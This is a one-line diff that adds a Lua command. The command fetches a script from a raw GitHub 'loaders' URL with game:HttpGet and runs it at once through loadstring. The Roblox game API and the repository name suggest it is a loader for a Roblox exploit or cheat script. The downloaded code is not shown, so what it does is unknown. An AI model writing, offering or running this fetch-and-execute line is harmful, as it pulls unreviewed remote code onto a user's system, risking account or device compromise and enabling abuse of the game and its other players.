@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/kukirin-life-testing-spam3-ija5eupsj1rlte.lua"))()
